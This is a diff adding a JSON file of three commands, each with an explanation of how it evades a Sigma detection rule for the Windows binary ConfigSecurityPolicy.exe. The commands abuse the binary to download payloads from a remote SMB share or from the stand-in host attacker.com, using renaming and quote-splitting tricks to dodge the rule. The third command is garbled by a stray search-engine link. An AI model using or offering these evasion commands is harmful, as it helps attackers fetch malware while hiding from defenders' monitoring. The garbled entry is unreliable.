@@ -1,0 +1,14 @@
+[
+  {
+    "output": "ConfigSecurityPolicy.exe \\\\10.0.0.5\\share\\payload.exe",
+    "explanation": "The Sigma rule specifically looks for the presence of 'http://', 'https://', or 'ftp://' protocols in the command line. By using a UNC path to download or execute a file from a remote SMB share, the selection\\_url criteria is not met, effectively bypassing the 'all of selection\\_\\*' condition."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\ConfigSecurityPolicy.exe C:\\Users\\Public\\csp.exe && C:\\Users\\Public\\csp.exe http://attacker.com/malware.exe",
+    "explanation": "The rule checks for Image ending with '\\ConfigSecurityPolicy.exe' or the OriginalFileName. While OriginalFileName is a strong check, many basic EDR/SIEM configurations primarily log the process name or path. By renaming the binary, the 'selection\\_img' condition for 'Image' or 'CommandLine' containing the specific filename might be evaded depending on the logging source's depth."
+  },
+  {
+    "output": "ConfigSecurityPolicy.exe htt\"p\"://[attacker.com/file.exe](https://www.google.com/search?q=https://attacker.com/file.exe)",
+    "explanation": "The rule uses a simple 'contains' check for the protocol strings. Depending on how the Windows command-line parser handles the input, adding quotes or environmental variables (e.g., %PROTO%://) can sometimes break simple string-matching logic in security products while still being interpreted correctly by the underlying binary."
+  }
+]
